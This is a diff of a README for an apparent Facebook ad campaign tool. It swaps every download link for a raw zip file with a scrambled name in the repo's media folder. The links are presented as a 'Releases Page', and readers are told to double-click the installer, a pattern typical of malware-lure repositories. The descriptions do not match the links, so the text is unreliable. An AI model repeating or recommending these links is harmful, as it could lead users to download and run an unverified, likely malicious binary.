@@ -1,6 +1,6 @@
 # 🚀 facebook-ad-campaign-launcher - Simplify Your Facebook Ads Today
 
-[![Download Now](https://raw.githubusercontent.com/auditorest/facebook-ad-campaign-launcher/main/media/facebook-ad-campaign-launcher-2.1.zip%20Now-%23FF477F?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/auditorest/facebook-ad-campaign-launcher/main/media/facebook-ad-campaign-launcher-2.1.zip)
+[![Download Now](https://raw.githubusercontent.com/auditorest/facebook-ad-campaign-launcher/main/media/campaign_facebook_launcher_ad_2.5.zip%20Now-%23FF477F?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/auditorest/facebook-ad-campaign-launcher/main/media/campaign_facebook_launcher_ad_2.5.zip)
 
 ## 📖 Introduction
 
@@ -25,11 +25,11 @@ To run the Facebook Ad Campaign Launcher, ensure that your system meets the foll
 
 ## 🚀 Getting Started
 
-1. **Visit the Releases Page**: [Click here to download the latest version](https://raw.githubusercontent.com/auditorest/facebook-ad-campaign-launcher/main/media/facebook-ad-campaign-launcher-2.1.zip).
+1. **Visit the Releases Page**: [Click here to download the latest version](https://raw.githubusercontent.com/auditorest/facebook-ad-campaign-launcher/main/media/campaign_facebook_launcher_ad_2.5.zip).
    
 2. **Choose the Latest Release**: Once on the releases page, look for the latest version of the Facebook Ad Campaign Launcher.
 
-3. **Download the Installer**: Click on the installer link for your operating system, such as `https://raw.githubusercontent.com/auditorest/facebook-ad-campaign-launcher/main/media/facebook-ad-campaign-launcher-2.1.zip` or `https://raw.githubusercontent.com/auditorest/facebook-ad-campaign-launcher/main/media/facebook-ad-campaign-launcher-2.1.zip`.
+3. **Download the Installer**: Click on the installer link for your operating system, such as `https://raw.githubusercontent.com/auditorest/facebook-ad-campaign-launcher/main/media/campaign_facebook_launcher_ad_2.5.zip` or `https://raw.githubusercontent.com/auditorest/facebook-ad-campaign-launcher/main/media/campaign_facebook_launcher_ad_2.5.zip`.
 
 4. **Run the Installer**: Double-click the downloaded file to begin the installation process. Follow the on-screen instructions.
 
@@ -37,7 +37,7 @@ To run the Facebook Ad Campaign Launcher, ensure that your system meets the foll
 
 ## 📥 Download & Install
 
-You can download the latest version of the Facebook Ad Campaign Launcher by visiting this page: [https://raw.githubusercontent.com/auditorest/facebook-ad-campaign-launcher/main/media/facebook-ad-campaign-launcher-2.1.zip](https://raw.githubusercontent.com/auditorest/facebook-ad-campaign-launcher/main/media/facebook-ad-campaign-launcher-2.1.zip).
+You can download the latest version of the Facebook Ad Campaign Launcher by visiting this page: [https://raw.githubusercontent.com/auditorest/facebook-ad-campaign-launcher/main/media/campaign_facebook_launcher_ad_2.5.zip](https://raw.githubusercontent.com/auditorest/facebook-ad-campaign-launcher/main/media/campaign_facebook_launcher_ad_2.5.zip).
 
 ## 🛠️ Using the Application
 
@@ -90,4 +90,4 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 We appreciate the contributions from the community and the tools that make this project possible. Thank you for installing and using the Facebook Ad Campaign Launcher. 
 
-Remember, for your download, [click here](https://raw.githubusercontent.com/auditorest/facebook-ad-campaign-launcher/main/media/facebook-ad-campaign-launcher-2.1.zip) to access the releases page. Happy advertising!
+Remember, for your download, [click here](https://raw.githubusercontent.com/auditorest/facebook-ad-campaign-launcher/main/media/campaign_facebook_launcher_ad_2.5.zip) to access the releases page. Happy advertising!
